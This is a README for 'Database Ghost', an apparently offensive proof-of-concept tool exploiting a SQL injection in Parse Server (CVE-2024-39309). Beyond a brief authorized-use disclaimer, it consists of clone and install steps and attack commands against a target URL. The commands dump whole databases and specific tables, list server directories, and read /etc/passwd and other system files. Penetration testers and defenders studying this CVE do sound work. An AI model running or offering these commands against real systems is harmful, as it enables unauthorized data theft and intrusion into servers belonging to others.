Database Ghost 🔥
Advanced PostgreSQL SQL Injection Exploitation Tool
<p align="center"> <img src="https://img.shields.io/badge/Python-3.6%2B-blue?style=for-the-badge&logo=python" alt="Python"> <img src="https://img.shields.io/badge/PostgreSQL-SQL%20Injection-red?style=for-the-badge&logo=postgresql" alt="PostgreSQL"> <img src="https://img.shields.io/badge/CVE-2024--39309-orange?style=for-the-badge" alt="CVE-2024-39309"> </p>

🚨 DISCLAIMER
FOR AUTHORIZED SECURITY TESTING ONLY
Unauthorized use is illegal. Use only on systems you own or have explicit permission to test.

⚡ QUICK START
Install & Run

```
git clone https://github.com/HeavyGhost-le/POC_SQL_injection_in_Parse_Server_prior_6.5.7_-_7.1.0.git
cd POC_SQL_injection_in_Parse_Server_prior_6.5.7_-_7.1.0
pip install requests
chmod +x star_ghost_english.py
```

# Basic Usage

```bash
# Full database enumeration
python3 star_ghost_english.py -u http://target:1337 -a your-app-id

# Enumerate specific table
python3 star_ghost_english.py -u http://target:1337 -a your-app-id -t users

# Read specific file
python3 star_ghost_english.py -u http://target:1337 -a your-app-id -f /etc/passwd

# List directory contents
python3 star_ghost_english.py -u http://target:1337 -a your-app-id -d /var/www

# Read common system files
python3 star_ghost_english.py -u http://target:1337 -a your-app-id --read-system

# Enumerate specific schema
python3 star_ghost_english.py -u http://target:1337 -a your-app-id -s custom_schema
